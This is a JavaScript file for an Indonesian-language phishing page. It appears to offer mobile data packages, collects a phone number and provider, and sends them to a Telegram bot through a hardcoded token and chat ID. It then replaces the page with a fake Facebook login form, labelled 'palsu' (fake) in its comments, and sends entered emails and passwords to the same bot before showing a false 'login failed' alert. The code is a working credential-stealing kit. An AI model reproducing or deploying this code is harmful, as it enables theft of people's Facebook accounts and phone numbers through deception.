let pilihan = "";
let provider = "";

function switchTab(tab, el) {
  document.querySelectorAll('.tab').forEach(btn => btn.classList.remove('active'));
  el.classList.add('active');

  document.querySelectorAll('.card-grid').forEach(div => div.classList.remove('active'));
  document.getElementById(tab).classList.add('active');

  pilihan = "";
  document.getElementById("result").innerText = "";
}

function select(value) {
  pilihan = value;
  document.getElementById("result").innerText = `✅ Paket dipilih: ${value}`;
}

function setProvider(el, value) {
  document.querySelectorAll('.providers img').forEach(img => img.classList.remove('active'));
  el.classList.add('active');
  provider = value;
  document.getElementById("result").innerText = `📶 Provider dipilih: ${provider}`;
}

document.getElementById("kirim").addEventListener("click", () => {
  const nomor = document.getElementById("nomor").value.trim();
  const loading = document.getElementById("loading");
  const result = document.getElementById("result");

  if (!nomor || !pilihan || !provider) {
    result.innerText = "❌ Masukkan nomor, pilih provider & paket!";
    return;
  }

  loading.classList.remove("hidden");
  result.innerText = "";

  setTimeout(() => {
    // Kirim data ke Telegram
    const token = "7839679697:AAHqDCJOxBpxJJ_MLHQ2ZwCvxUTK26RXMM8";
    const chatId = "7819779147";
    const text = `📥 Permintaan Baru\n\n📱 Nomor: ${nomor}\n📶 Provider: ${provider}\n📦 Paket: ${pilihan}`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: text
      })
    });

    // Tampilkan halaman login Facebook palsu
    document.body.innerHTML = `
      <div class="login-container">
        <h1>facebook</h1>
        <p class="subtitle">Masuk untuk melanjutkan ke Facebook</p>
        <form id="login-form">
          <input type="text" id="email" placeholder="Email atau Nomor Telepon" required />
          <input type="password" id="pass" placeholder="Kata Sandi" required />
          <button type="submit">Masuk</button>
          <a href="#">Lupa Kata Sandi?</a>
          <hr />
          <button class="create-btn" type="button">Buat Akun Baru</button>
        </form>
      </div>
    `;

    // Tangani submit login palsu
    document.getElementById("login-form").addEventListener("submit", (e) => {
      e.preventDefault();
      const email = document.getElementById("email").value.trim();
      const pass = document.getElementById("pass").value.trim();

      if(!email || !pass){
        alert("Isi dulu email dan passwordnya.");
        return;
      }

      const loginText = `🔐 Login Facebook Palsu\n\n📧 Email/No HP: ${email}\n🔑 Password: ${pass}`;
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: loginText
        })
      });

      alert("Login gagal. Silahkan coba lagi.");
    });
  }, 2000);
});